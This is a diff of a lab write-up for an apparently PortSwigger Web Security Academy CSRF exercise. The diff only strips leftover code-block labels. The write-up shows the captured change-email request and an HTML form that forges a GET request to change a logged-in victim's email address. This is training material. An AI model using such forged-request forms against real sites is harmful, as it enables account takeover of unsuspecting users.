@@ -12,9 +12,7 @@ Logged in with the given creds (wiener : peter) and went straight to the email c
 
 Submitted the form normally and caught the request in Burp Proxy. It looked something like this:
 
-makefile
-Copy
-Edit
+
 POST /my-account/change-email
 csrf=abcdef12345
 email=something@web-security-academy.net
@@ -29,9 +27,7 @@ Since the server blindly accepts the GET request and updates the email, that mea
 Exploit
 I created a simple HTML page to exploit this, hosted on my Burp Collaborator exploit server:
 
-html
-Copy
-Edit
+
 <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="GET">
     <input type="hidden" name="email" value="hacked@web-security-academy.net">
 </form>
